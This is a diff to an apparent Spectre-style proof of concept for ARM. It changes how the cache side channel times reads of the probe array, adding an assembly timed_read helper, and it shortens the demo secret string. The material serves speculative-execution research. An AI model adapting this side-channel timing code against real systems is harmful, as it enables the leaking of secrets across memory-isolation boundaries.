@@ -19,7 +19,7 @@
 volatile uint64_t countertime = 0;
 uint8_t channel[256 * GAP]; // side channel to extract secret phrase
 uint64_t *target; // pointer to indirect call target
-char *secret = "The Magic Words are Squeamish Ossifrage.";
+char *secret = "The Magic Words.";
 
 clock_t start, end;
 
@@ -28,6 +28,18 @@ void *inc_countertime(void *a) {
 		countertime++;
 		asm volatile ("DMB SY");
 	}
+}
+
+static uint64_t timed_read(volatile uint8_t *addr) {
+	uint64_t ns = countertime;
+
+	asm volatile (
+		"DSB SY\n"
+		"LDR X5, [%[ad]]\n"
+		"DSB SY\n"
+		: : [ad] "r" (addr) : "x5");
+
+	return countertime - ns;
 }
 
 // mistrained target of indirect call
@@ -93,9 +105,10 @@ void readByte(char *addr_to_read, char result[2], int score[2])
 {
   int hits[256]; // record number of cache hits
   int tries, i, j, k, mix_i, junk = 0;
-  uint64_t elapsed;
+  //uint64_t elapsed;
   uint8_t *addr;
   char dummyChar = '$';
+  register uint64_t time2;
   
   pthread_t inc_countertime_thread;
 	if (pthread_create(&inc_countertime_thread, NULL, inc_countertime, NULL)) {
@@ -141,12 +154,13 @@ void readByte(char *addr_to_read, char result[2], int score[2])
     // time reads, mix up order to prevent stride prediction
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
-      addr = &channel[mix_i * GAP];
-      int startt = countertime;
-      junk ^= *addr;
+      time2 = timed_read(&channel[mix_i * GAP]);
+      //addr = &channel[mix_i * GAP];
+      //int startt = countertime;
+      //junk ^= *addr;
       asm volatile ("DMB SY"); // make sure read completes before we check the timer
-      elapsed = countertime - startt;
-      if (elapsed <= CACHE_HIT_THRESHOLD) {
+      //elapsed = countertime - startt;
+      if (time2 <= CACHE_HIT_THRESHOLD) {
         hits[mix_i]++;
 	}
     }
@@ -168,7 +182,7 @@ void readByte(char *addr_to_read, char result[2], int score[2])
   }
 
   // printf("Used %lld instructions\n", count);
-  //printf("elap: %ld\n", elapsed);
+  printf("time2: %ld\n", time2);
   hits[0] ^= junk; // prevent junk from being optimized out
   result[0] = (char)j;
   score[0] = hits[j];
